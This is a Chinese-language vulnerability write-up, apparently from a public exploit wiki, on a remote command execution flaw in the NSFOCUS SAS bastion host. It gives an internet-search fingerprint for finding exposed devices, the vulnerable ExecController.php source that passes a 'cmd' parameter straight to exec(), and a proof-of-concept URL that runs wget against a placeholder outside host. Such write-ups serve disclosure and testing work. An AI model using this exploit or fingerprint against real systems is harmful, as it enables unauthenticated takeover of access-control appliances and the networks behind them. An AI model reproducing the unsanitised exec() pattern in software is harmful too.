# 绿盟 SAS堡垒机 Exec 远程命令执行漏洞

## 漏洞描述

绿盟 SAS堡垒机 Exec 远程命令执行漏洞

## 漏洞影响

<a-checkbox checked>绿盟 SAS堡垒机</a-checkbox></br>

## 网络测绘

<a-checkbox checked>body="'/needUsbkey.php?username='"</a-checkbox></br>

## 漏洞复现

登陆页面

![img](../../../.vuepress/public/img/1687843929584-e793a136-93ec-4b19-8ee9-5738c91681e8-20230810133806265.png)

漏洞存在于文件 ExecController.php 文件中

![img](../../../.vuepress/public/img/1691645538909-d812cd3c-58f8-4325-b91e-456dce6b9a3c.png)

```php
<?php
  require_once 'Nsc/Websvc/Response.php';
class ExecController extends Cavy_Controller_Action {

  var $models = 'no';

  public function index() {
    $command = $this->_params['cmd'];
    $ret = 0;
    $output = array();
    exec($command,$output,$ret);
    $result = new StdClass;
    if ($ret != 0) {
      $result->code = Nsc_Websvc_Response::EXEC_ERROR;
      $result->text = "exec error";
    }
    else {
      $result->code = Nsc_Websvc_Response::SUCCESS;
      //			$result->text = implode("\n",$output);
      $result->text = "WEBSVC OK";
    }
    $this->_render(array('result'=>$result),'/websvc/result');
  }
}
?>
```

验证POC

```php
/webconf/Exec/index?cmd=wget%20xxx.xxx.xxx
```

![img](../../../.vuepress/public/img/1691645555190-0e9d0dbb-97bc-4569-9357-e0bf65c3138d.png)

![img](../../../.vuepress/public/img/1691645814709-0b0ac94f-1899-4cfb-9751-7037cfecd3ef.png)